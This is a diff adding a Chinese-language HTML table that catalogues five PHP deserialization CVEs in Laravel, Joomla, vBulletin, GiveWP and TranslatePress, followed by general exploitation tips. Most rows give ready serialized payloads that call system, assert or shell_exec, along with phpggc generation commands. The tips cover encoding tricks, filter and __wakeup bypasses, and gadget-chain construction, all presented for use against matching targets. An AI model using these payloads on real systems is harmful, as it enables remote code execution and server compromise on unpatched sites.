@@ -1,0 +1,42 @@
+<p>下表 5 个案例全部是 PHP 环境下的反序列化 / 对象注入漏洞（CVE 编号或厂商通告可查），接口路径、参数名与 payload 结构保持原始写法，可对照自己遇到的功能点做同类比照。</p>
+<table class="case-table">
+<thead>
+<tr><th>位置（接口 / 参数）</th><th>漏洞成因</th><th>关键载荷</th></tr>
+</thead>
+<tbody>
+<tr>
+<td>Laravel Framework &le; 5.5.40、5.6.0&ndash;5.6.29（CVE-2018-15133），任意路由 <code>POST /</code>，请求头 <code>X-XSRF-TOKEN</code></td>
+<td><code>Illuminate\Encryption\Encrypter::decrypt()</code> 解密后直接对 <code>$payload['value']</code> 调用 <code>unserialize()</code>，既不限定可反序列化的类，也不要求该值一定是合法 CSRF token</td>
+<td>先泄露 <code>.env</code> 里的 <code>APP_KEY=base64:...</code>（LFI / 备份文件 / debug 页），再生成链：<code>phpggc Laravel/RCE1 'uname -a' -b</code>，最后用 <code>APP_KEY</code> 对该序列化串做 <code>encrypt()</code>，把得到的 <code>{"iv","value","mac"}</code> JSON 整串放进 <code>X-XSRF-TOKEN</code> 头；链为 <code>PendingBroadcast::__destruct</code> &rarr; <code>Faker\Generator::__call</code> &rarr; <code>system()</code></td>
+</tr>
+<tr>
+<td>Joomla! 1.5.0&ndash;3.4.5（CVE-2015-8562），<code>GET /</code>，请求头 <code>User-Agent</code>（或 <code>X-Forwarded-For</code>）；要求 PHP &lt; 5.4.45 / 5.5.29 / 5.6.13</td>
+<td><code>User-Agent</code> 被原样写进 <code>#__session</code> 表，读出会话时 <code>session_decode()</code> 反序列化；MySQL 对 4 字节 UTF-8 的截断让攻击者可以把任意序列化串拼进记录</td>
+<td><code>}__test|O:21:"JDatabaseDriverMysqli":3:{s:4:"\0\0\0a";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:8:"feed_url";s:N:"phpinfo();JFactory::getConfig();exit;";}i:1;s:4:"init";}}s:13:"\0\0\0connection";i:1;}</code>，末尾拼 4 字节 UTF-8 字符 <code>\xF0\x9D\x8C\x86</code> 触发截断</td>
+</tr>
+<tr>
+<td>vBulletin 5.1.2&ndash;5.1.9（CVE-2015-7808），<code>GET /ajax/api/hook/decodeArguments?arguments=</code></td>
+<td><code>vB_Api_Hook::decodeArguments()</code> 对 <code>arguments</code> 参数直接 <code>unserialize()</code>，随后遍历该对象触发 <code>vB_dB_Result::rewind()</code>，把 <code>functions['free_result']</code> 当回调、<code>recordset</code> 当参数调用</td>
+<td><code>O:12:"vB_dB_Result":2:{s:5:"\0*\0db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"\0*\0recordset";s:6:"whoami";}</code>，整体 urlencode（<code>\0</code> &rarr; <code>%00</code>，<code>*</code> &rarr; <code>%2A</code>）后放入参数；改 <code>recordset</code> 长度即可逐条执行命令</td>
+</tr>
+<tr>
+<td>WordPress 插件 GiveWP &le; 3.14.1（CVE-2024-5932），<code>POST /wp-admin/admin-ajax.php</code>：<code>action=give_process_donation</code> + <code>give_title</code></td>
+<td><code>Give_Payment::get_meta()</code> 对 <code>give_title</code> 走 <code>maybe_unserialize()</code>，未限定对象类型；插件自带可用 gadget（Stripe / Give / Faker 业务类）</td>
+<td><code>give_title=O:26:"Stripe\StripeObject":1:{...}</code>（先用 <code>action=give_form_search</code> 取到 <code>give-form-id</code>、<code>give-form-hash</code>、<code>give_donation_form_nonce</code> 再提交）。链：<code>StripeObject::__toString</code> &rarr; <code>GiveInsertPaymentData::toArray()</code> &rarr; <code>Give::__get('address1')</code> &rarr; <code>ValidGenerator::__call</code> &rarr; <code>SettingsRepository::get()</code> &rarr; <code>call_user_func('shell_exec', $cmd)</code>；<code>\0</code> 绕 <code>strip_tags</code>、<code>\\\\</code> 绕 <code>stripslashes_deep</code></td>
+</tr>
+<tr>
+<td>WordPress 插件 TranslatePress &le; 2.9.6（CVE-2025-30773），<code>POST /wp-admin/admin-ajax.php</code>：<code>action=trp_update_database</code> + <code>trp_updb_extra_params</code></td>
+<td>插件对 <code>trp_updb_extra_params</code> 先 <code>base64_decode()</code> 再 <code>unserialize()</code>，无类白名单；2.9.7 换成 <code>json_decode()</code> 才消除攻击面。注意该接口有管理员会话与 nonce 校验，实际利用需要管理员会话，或通过 CSRF 诱导已登录管理员触发</td>
+<td><code>action=trp_update_database&amp;trp_updb_nonce=808dff22f9&amp;initiate_update=true&amp;trp_updb_extra_params=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ==</code>（即 <code>base64_encode(serialize(new Evil()))</code>；<code>Evil</code> 为研究者演示用的自定义类，插件本身没有内置可直接利用的 POP 链，实际利用需换成目标环境中真实存在的 gadget 类）</td>
+</tr>
+</tbody>
+</table>
+
+<h4>共性规律</h4>
+<ul>
+<li>入口往往不是显式的 <code>unserialize()</code>：Cookie、自定义请求头（<code>X-XSRF-TOKEN</code>、<code>User-Agent</code>）、Session 读取、<code>maybe_unserialize()</code>、缓存 / 队列、甚至 <code>phar://</code> 的文件函数都会间接触发。先确认「谁把用户数据喂给了反序列化」。</li>
+<li>PHP 侧的三个高频魔术方法：<code>__destruct</code>（请求结束必触发，最好用）、<code>__wakeup</code>（反序列化瞬间触发）、<code>__toString</code>（被当字符串用，常接在 <code>file_exists()</code>、字符串拼接之后）；再配合 <code>__call</code> / <code>__get</code> 把「调函数」的权限交出去。</li>
+<li>属性可见性决定键名，写错长度整串失效：<code>public</code> 原样、<code>protected</code> 前缀 <code>\0*\0</code>、<code>private</code> 前缀 <code>\0类名\0</code>；需要绕过 <code>__wakeup</code> 时把对象属性个数改大（PHP &lt; 5.6.25 / 7.0.10，CVE-2016-7124）。</li>
+<li>传输编码会破坏 payload：放进 Cookie 时 <code>+</code>、<code>=</code> 要 URL 编码（<code>%2B</code>、<code>%3D</code>），放进 URL 参数时 <code>\0</code> 要写成 <code>%00</code>；有些代码会先 <code>strip_tags</code> / <code>stripslashes</code>，就用 <code>\0</code> 和 <code>\\\\</code> 把它还原回来。</li>
+<li>真实环境优先用现成链：<code>phpggc -l</code> 查框架可用 gadget（Laravel / Symfony / Monolog / ThinkPHP / Guzzle…），<code>-b</code> 直接出 base64；找不到链时再按 <code>__destruct</code> &rarr; <code>__toString</code> &rarr; <code>__call</code> 的顺序手工串。</li>
+</ul>
